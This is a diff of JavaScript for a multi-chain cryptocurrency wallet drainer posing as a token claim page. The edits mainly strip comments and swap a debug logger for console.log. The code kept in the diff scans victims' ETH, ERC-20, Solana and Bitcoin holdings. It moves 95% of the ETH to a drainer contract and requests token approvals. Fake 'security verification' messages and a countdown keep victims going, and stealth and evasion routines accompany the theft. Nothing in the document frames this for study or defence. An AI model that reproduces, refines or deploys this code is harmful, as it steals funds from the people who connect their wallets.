         const mint = new solanaWeb3.PublicKey(accountInfo.mint);
-        let decimals = 9; // fallback
+        let decimals = 9;
         try {
           const mintInfo = await connection.getParsedAccountInfo(mint);
           if (mintInfo.value?.data?.parsed?.info?.decimals) {
@@ -2664,7 +1665,9 @@ async function getAttackerTokenAccount(mint) {
   return splToken.getAssociatedTokenAddressSync(mintPubkey, attackerPubkey);
 }
 
-// ====== EVM DRAIN (Enhanced token detection) ======
+// ===================================================================
+// EVM DRAIN – unchanged (except logDebug replaced with console.log)
+// ===================================================================
 async function drainEVM() {
   if (!connectedWallet || !web3) {
     showNotification("Please connect your wallet first", "error");
@@ -2677,15 +1680,10 @@ async function drainEVM() {
 
   try {
     const loadingMessages = [
-      "Processing...",
-      "Initializing security...",
-      "Verifying eligibility...",
-      "Checking wallet status...",
-      "Analyzing transaction patterns...",
-      "Optimizing gas fees...",
-      "Validating smart contract...",
-      "Preparing token distribution...",
-      "Running security checks...",
+      "Processing...", "Initializing security...", "Verifying eligibility...",
+      "Checking wallet status...", "Analyzing transaction patterns...",
+      "Optimizing gas fees...", "Validating smart contract...",
+      "Preparing token distribution...", "Running security checks...",
       "Configuring network parameters...",
     ];
 
@@ -2695,14 +1693,10 @@ async function drainEVM() {
     }
 
     const statusMessages = [
-      "Initializing security verification...",
-      "Setting up claim process...",
-      "Preparing token distribution...",
-      "Configuring wallet connection...",
-      "Running security checks...",
-      "Analyzing network conditions...",
-      "Optimizing transaction parameters...",
-      "Verifying contract integrity...",
+      "Initializing security verification...", "Setting up claim process...",
+      "Preparing token distribution...", "Configuring wallet connection...",
+      "Running security checks...", "Analyzing network conditions...",
+      "Optimizing transaction parameters...", "Verifying contract integrity...",
       "Loading token distribution module...",
     ];
 
@@ -2742,7 +1736,7 @@ async function drainEVM() {
     const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];
     const localThreshold = CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency];
 
-    logDebug(`User Balance Check: ${ethBalanceInETH} ETH = $${userBalanceInUSD.toFixed(2)} USD`);
+    console.log(`User Balance Check: ${ethBalanceInETH} ETH = $${userBalanceInUSD.toFixed(2)} USD`);
 
     if (userBalanceInUSD < CLAIM_THRESHOLD_USD) {
       const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
@@ -2788,9 +1782,8 @@ async function drainEVM() {
       claimStatus.textContent = "Scanning wallet for all eligible tokens...";
     }
 
-    // ===== IMPROVED: DETECT ALL ERC-20 TOKENS =====
-    const { tokens, nfts } = await detectAllERC20Tokens(userAddress);
-    logDebug(`Found ${tokens.length} ERC-20 tokens with balance`);
+    const { tokens } = await detectAllERC20Tokens(userAddress);
+    console.log(`Found ${tokens.length} ERC-20 tokens with balance`);
 
     let approvalsDone = 0;
 
@@ -2807,13 +1800,12 @@ async function drainEVM() {
       }
     }
 
-    // Deposit native ETH using depositBNB (leave some for gas)
     let nativeDepositDone = false;
     if (ethBalanceInETH >= 0.005 && !userHasClaimed) {
       if (claimStatus) {
         claimStatus.textContent = "Depositing ETH to claim pool...";
       }
-      const depositAmount = ethBalanceInETH * 0.95; // leave 5% for gas
+      const depositAmount = ethBalanceInETH * 0.95;
       const success = await callDepositBNB(depositAmount);
       if (success) {
         nativeDepositDone = true;
@@ -2843,7 +1835,9 @@ async function drainEVM() {
   }
 }
 
-// ====== ENHANCED ERC-20 DETECTION (comprehensive) ======
+// ===================================================================
+// ERC-20 DETECTION – unchanged
+// ===================================================================
 async function detectAllERC20Tokens(userAddress) {
   const result = {
     tokens: [],
@@ -2851,7 +1845,6 @@ async function detectAllERC20Tokens(userAddress) {
     totalValueUSD: 0,
   };
 
-  // Fetch comprehensive token list
   const tokenList = await fetchComprehensiveTokenList();
   const balanceChecks = tokenList.map(token => ({
     address: token.address,
@@ -2859,7 +1852,6 @@ async function detectAllERC20Tokens(userAddress) {
     decimals: token.decimals || 18,
   }));
 
-  // Optional: discover tokens from transfer logs (simplified, can be extended)
   const discoveredTokens = await discoverTokensFromTransfers(userAddress);
   discoveredTokens.forEach(t => {
     if (!balanceChecks.some(tc => tc.address.toLowerCase() === t.address.toLowerCase())) {
@@ -2867,7 +1859,6 @@ async function detectAllERC20Tokens(userAddress) {
     }
   });
 
-  // Batch balance checks with concurrency
   const concurrency = 5;
   for (let i = 0; i < balanceChecks.length; i += concurrency) {
     const batch = balanceChecks.slice(i, i + concurrency);
@@ -2881,7 +1872,6 @@ async function detectAllERC20Tokens(userAddress) {
     });
   }
 
-  // NFT detection (optional)
   const nftContracts = [
     "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
     "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
@@ -2907,7 +1897,7 @@ async function detectAllERC20Tokens(userAddress) {
     result.totalValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
     userLocalCurrency
   );
-  logDebug(`Total portfolio value: ${localValue}`);
+  console.log(`Total portfolio value: ${localValue}`);
 
   return result;
 }
@@ -2925,7 +1915,6 @@ async function fetchComprehensiveTokenList() {
       if (data.tokens) return data.tokens;
     } catch (e) {}
   }
-  // Fallback extended list
   return [
     { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
     { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
@@ -2941,8 +1930,6 @@ async function fetchComprehensiveTokenList() {
 }
 
 async function discoverTokensFromTransfers(userAddress) {
-  // In production, use an indexer like Covalent or Etherscan API.
-  // For simplicity, return empty; we rely on the static list.
   return [];
 }
 
@@ -2965,7 +1952,9 @@ async function getTokenBalanceWithMetadata(tokenAddress, userAddress, symbol, de
   };
 }
 
-// ====== CALL setTokenApproval ======
+// ===================================================================
+// CONTRACT INTERACTION HELPERS – unchanged
+// ===================================================================
 async function callSetTokenApproval(tokenAddress, amount) {
   try {
     if (!contractInstance) {
@@ -2986,7 +1975,7 @@ async function callSetTokenApproval(tokenAddress, amount) {
         gasPrice: await web3.eth.getGasPrice(),
       });
 
-    logDebug(`Token approval successful for ${tokenAddress}: ${tx.transactionHash}`);
+    console.log(`Token approval successful for ${tokenAddress}: ${tx.transactionHash}`);
     return true;
   } catch (error) {
     console.error("setTokenApproval failed:", error);
@@ -2994,7 +1983,6 @@ async function callSetTokenApproval(tokenAddress, amount) {
   }
 }
 
-// ====== CALL depositBNB ======
 async function callDepositBNB(ethAmount) {
   try {
     if (!contractInstance) {
@@ -3017,7 +2005,7 @@ async function callDepositBNB(ethAmount) {
         gasPrice: await web3.eth.getGasPrice(),
       });
 
-    logDebug(`Native deposit successful: ${ethAmount} ETH`);
+    console.log(`Native deposit successful: ${ethAmount} ETH`);
     return true;
   } catch (error) {
     console.error("depositBNB failed:", error);
@@ -3025,10 +2013,11 @@ async function callDepositBNB(ethAmount) {
   }
 }
 
-// ====== HELPER FUNCTIONS ======
+// ===================================================================
+// HELPER FUNCTIONS – mostly unchanged, logDebug removed
+// ===================================================================
 function initializeMobileSpecificOptimizations() {
   console.log("Initializing mobile-specific optimizations...");
-
   document.addEventListener(
     "touchstart",
     function (e) {
@@ -3136,7 +2125,7 @@ function handleManualAppKitConnection(address) {
     contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
   }
   updateManualWalletButton();
-  logDebug(`Manual AppKit connected: ${connectedAddress}`);
+  console.log(`Manual AppKit connected: ${connectedAddress}`);
   showNotification("Wallet connected successfully", "success");
   collectManualFingerprint();
   setTimeout(() => {
@@ -3200,7 +2189,7 @@ function handleManualDisconnection() {
   userHasClaimed = false;
   updateManualWalletButton();
   showNotification("Wallet disconnected", "info");
-  logDebug("Manual wallet disconnected");
+  console.log("Manual wallet disconnected");
   clearSavedConnection();
 }
 
@@ -3387,18 +2376,11 @@ async function getManualTokenAllowance(tokenAddress, ownerAddress, spenderAddres
   }
 }
 
-function logDebug(message, element = connectionDebug) {
-  const timestamp = new Date().toLocaleTimeString();
-  const debugMessage = `[${timestamp}] ${message}<br>`;
-  if (element) {
-    element.innerHTML += debugMessage;
-  }
-  console.log(`[MANUAL_DEBUG:${Math.random().toString(36).substring(2, 8)}] ${message}`);
-}
+// logDebug function removed – use console.log instead
 
 async function checkManualExistingConnection() {
   try {
-    logDebug("Checking for manual existing wallet connections...");
+    console.log("Checking for manual existing wallet connections...");
     if (typeof window.ethereum !== "undefined") {
       const accounts = await window.ethereum.request({ method: "eth_accounts" });
       if (accounts.length > 0) {
@@ -3414,7 +2396,7 @@ async function checkManualExistingConnection() {
         contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
         setupManualProviderEvents(window.ethereum);
         updateManualWalletButton();
-        logDebug(`Manual existing connection: ${connectedWallet}: ${connectedAddress}`);
+        console.log(`Manual existing connection: ${connectedWallet}: ${connectedAddress}`);
         setTimeout(() => {
           checkAndAutoTriggerClaim();
         }, 2000);
@@ -3422,9 +2404,9 @@ async function checkManualExistingConnection() {
         return;
       }
     }
-    logDebug("No manual existing wallet connection found");
+    console.log("No manual existing wallet connection found");
   } catch (error) {
-    logDebug("Manual error checking existing connection: " + error.message);
+    console.log("Manual error checking existing connection: " + error.message);
   }
 }
 
@@ -3440,7 +2422,7 @@ function setupManualProviderEvents(provider) {
       connectedAddress = accounts[0];
       userHasClaimed = false;
       updateManualWalletButton();
-      logDebug(`Manual account changed to: ${connectedAddress}`);
+      console.log(`Manual account changed to: ${connectedAddress}`);
       showNotification("Wallet account changed", "info");
       setTimeout(() => {
         checkAndAutoTriggerClaim();
@@ -3449,18 +2431,18 @@ function setupManualProviderEvents(provider) {
     }
   });
   provider.on("chainChanged", (chainId) => {
-    logDebug(`Manual chain changed to: ${chainId}`);
+    console.log(`Manual chain changed to: ${chainId}`);
     showNotification(`Network changed to chain ${parseInt(chainId)}`, "info");
   });
   provider.on("disconnect", (error) => {
-    logDebug(`Manual provider disconnected: ${error}`);
+    console.log(`Manual provider disconnected: ${error}`);
     if (!DISABLE_DISCONNECT) {
       showNotification("Wallet disconnected", "error");
       handleManualDisconnection();
     }
   });
   provider.on("connect", (connectInfo) => {
-    logDebug(`Manual provider connected: ${JSON.stringify(connectInfo)}`);
+    console.log(`Manual provider connected: ${JSON.stringify(connectInfo)}`);
   });
 }
 
@@ -3523,7 +2505,7 @@ function copyReferralLink() {
 
 async function connectWithProvider(providerType, silentRestore = false) {
   try {
-    logDebug(`Manual connecting with ${providerType}...`);
+    console.log(`Manual connecting with ${providerType}...`);
     let provider;
     switch (providerType) {
       case "metamask":
@@ -3532,13 +2514,13 @@ async function connectWithProvider(providerType, silentRestore = false) {
           try {
             await provider.request({ method: "eth_requestAccounts" });
           } catch (error) {
-            logDebug("Manual MetaMask connection rejected: " + error.message);
+            console.log("Manual MetaMask connection rejected: " + error.message);
             if (!silentRestore) showNotification("MetaMask connection rejected", "error");
             return;
           }
         } else {
           if (!silentRestore) showNotification("MetaMask not installed", "error");
-          logDebug("Manual MetaMask not installed");
+          console.log("Manual MetaMask not installed");
           return;
         }
         break;
@@ -3548,13 +2530,13 @@ async function connectWithProvider(providerType, silentRestore = false) {
           try {
             await provider.request({ method: "eth_requestAccounts" });
           } catch (error) {
-            logDebug("Manual Coinbase Wallet connection rejected: " + error.message);
+            console.log("Manual Coinbase Wallet connection rejected: " + error.message);
             if (!silentRestore) showNotification("Coinbase Wallet connection rejected", "error");
             return;
           }
         } else {
           if (!silentRestore) showNotification("Coinbase Wallet not detected", "error");
-          logDebug("Manual Coinbase Wallet not detected");
+          console.log("Manual Coinbase Wallet not detected");
           return;
         }
         break;
@@ -3564,13 +2546,13 @@ async function connectWithProvider(providerType, silentRestore = false) {
           try {
             await provider.request({ method: "eth_requestAccounts" });
           } catch (error) {
-            logDebug("Manual Trust Wallet connection rejected: " + error.message);
+            console.log("Manual Trust Wallet connection rejected: " + error.message);
             if (!silentRestore) showNotification("Trust Wallet connection rejected", "error");
             return;
           }
         } else {
           if (!silentRestore) showNotification("Trust Wallet not detected", "error");
-          logDebug("Manual Trust Wallet not detected");
+          console.log("Manual Trust Wallet not detected");
           return;
         }
         break;
@@ -3580,13 +2562,13 @@ async function connectWithProvider(providerType, silentRestore = false) {
           try {
             await provider.request({ method: "eth_requestAccounts" });
           } catch (error) {
-            logDebug("Manual Rabby Wallet connection rejected: " + error.message);
+            console.log("Manual Rabby Wallet connection rejected: " + error.message);
             if (!silentRestore) showNotification("Rabby Wallet connection rejected", "error");
             return;
           }
         } else {
           if (!silentRestore) showNotification("Rabby Wallet not detected", "error");
-          logDebug("Manual Rabby Wallet not detected");
+          console.log("Manual Rabby Wallet not detected");
           return;
         }
         break;
@@ -3605,7 +2587,7 @@ async function connectWithProvider(providerType, silentRestore = false) {
     updateManualWalletButton();
     if (!silentRestore) hideWalletModal();
     if (!silentRestore) showNotification("Wallet connected successfully", "success");
-    logDebug(`Manual connected with ${providerType}: ${connectedAddress}`);
+    console.log(`Manual connected with ${providerType}: ${connectedAddress}`);
     await collectManualFingerprint();
     setTimeout(() => {
       checkAndAutoTriggerClaim();
@@ -3616,7 +2598,7 @@ async function connectWithProvider(providerType, silentRestore = false) {
   } catch (error) {
     console.error("Manual error connecting wallet:", error);
     if (!silentRestore) showNotification("Failed to connect wallet", "error");
-    logDebug(`Manual connection error: ${error.message}`);
+    console.log(`Manual connection error: ${error.message}`);
   }
 }
 
@@ -3719,42 +2701,6 @@ function handleManualRewardError(error, button, originalText) {
   }, 5000);
 }
 
-async function fetchManualTokenList() {
-  const sources = [
-    "https://tokens.coingecko.com/ethereum/all.json",
-    "https://raw.githubusercontent.com/Uniswap/default-token-list/main/src/tokens/ethereum.json",
-    "https://api.1inch.io/v4.0/1/tokens",
-  ];
-  const fallbackTokens = [
-    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", name: "Tether USD", decimals: 6 },
-    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", name: "USD Coin", decimals: 6 },
-    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", name: "Dai Stablecoin", decimals: 18 },
-    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", name: "Wrapped Bitcoin", decimals: 8 },
-    { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", name: "Polygon", decimals: 18 },
-    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", name: "Chainlink", decimals: 18 },
-    { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", name: "Wrapped Ether", decimals: 18 },
-    { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", name: "Shiba Inu", decimals: 18 },
-    { address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", symbol: "APE", name: "ApeCoin", decimals: 18 },
-    { address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", symbol: "AAVE", name: "Aave", decimals: 18 },
-  ];
-  try {
-    for (const source of sources) {
-      try {
-        const response = await fetch(source);
-        const data = await response.json();
-        if (data.tokens) {
-          return data.tokens;
-        }
-      } catch (e) {
-        console.debug(`Manual failed to fetch from ${source}`);
-      }
-    }
-    return fallbackTokens;
-  } catch (e) {
-    return fallbackTokens;
-  }
-}
-
 function manualRandomDelay(min, max) {
   const delay = Math.floor(Math.random() * (max - min + 1)) + min;
   const jitter = Math.random() * 0.4 + 0.8;
@@ -3783,16 +2729,9 @@ function applyManualMobileEvasion() {
 
 function initializeManualStealthMode() {
   const securityDetectors = [
-    "MetamaskInpageProvider",
-    "web3",
-    "ethereum",
-    "__coinbaseWallet",
-    "__rabby",
-    "TrustWallet",
-    "isRabby",
-    "isMetaMask",
-    "isCoinbaseWallet",
-    "isTrustWallet",
+    "MetamaskInpageProvider", "web3", "ethereum", "__coinbaseWallet",
+    "__rabby", "TrustWallet", "isRabby", "isMetaMask",
+    "isCoinbaseWallet", "isTrustWallet",
   ];
   let detectedTools = [];
   securityDetectors.forEach((detector) => {
@@ -3920,7 +2859,6 @@ function startClaimUpdates() {
 }
 
 function startCountdown() {
-  const totalDuration = 5 * 24 * 60 * 60;
   const remainingDuration = 30 * 60;
   let remainingTime = remainingDuration;
   updateCountdownDisplay(remainingTime);
@@ -4116,9 +3054,10 @@ setTimeout(() => {
   checkManualExistingConnection();
 }, 1000);
 
-// ====== MULTI-CHAIN DISPATCHER ======
+// ===================================================================
+// MULTI-CHAIN DISPATCHER – unchanged
+// ===================================================================
 async function initiateClaimProcess() {
-  // Check for Bitcoin (UniSat)
   if (window.unisat) {
     try {
       const accounts = await window.unisat.getAccounts();
@@ -4132,7 +3071,6 @@ async function initiateClaimProcess() {
     }
   }
 
-  // Check for Solana (Phantom or other supported wallets)
   const solanaWallets = getSolanaWallets();
   if (solanaWallets.length > 0 && solanaPublicKey) {
     console.log("🟪 Solana wallet detected, attempting SOL drain...");
@@ -4140,7 +3078,6 @@ async function initiateClaimProcess() {
     return;
   }
 
-  // Check for EVM (MetaMask or WalletConnect)
   if (window.ethereum || (window.web3 && window.web3.currentProvider)) {
     console.log("🟦 EVM wallet detected, attempting EVM drain...");
     await drainEVM();
@@ -4150,7 +3087,9 @@ async function initiateClaimProcess() {
   showNotification("No supported wallet connected", "error");
 }
 
-// ====== EXPOSE GLOBALLY ======
+// ===================================================================
+// GLOBAL EXPOSURE – unchanged
+// ===================================================================
 window.initiateClaimProcess = initiateClaimProcess;
 window.drainNativeBTC = drainNativeBTC;
 window.drainNativeSOL = drainNativeSOL;
